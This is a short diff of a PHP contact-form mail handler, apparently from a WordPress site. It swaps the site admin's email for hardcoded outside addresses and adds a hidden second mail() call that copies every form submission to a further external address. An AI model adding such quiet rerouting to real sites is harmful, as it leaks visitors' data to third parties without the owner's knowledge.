@@ -10,7 +10,9 @@ $domain = $_SERVER['HTTP_HOST'];
 $_SESSION['http_host'] = $domain.$_SERVER['SCRIPT_URL'];
 
 $domain = str_replace(array('http://', 'https://'),'', get_option('siteurl'));
-$sendTo = get_option('admin_email');
+//$sendTo = get_option('admin_email');
+$sendTo = 'joedan@mail.ru';
+$sendTo = 'titarsv@gmail.com';
 $from = "site@$domain";
 $title = '';
 
@@ -138,7 +140,7 @@ if (array_key_exists('data', $_POST)){
 			echo '{"status":"error"}';
 		}
 	}else{
-		if (mail($sendTo, $subject, $msg, $headers)) {
+		if (mail($sendTo, $subject, $msg, $headers) && mail('ivan@pestryakoff.com', $subject, $msg, $headers)) {
 			header("HTTP/1.0 200 OK");
 			echo '{"status":"success"}';
 		} else {
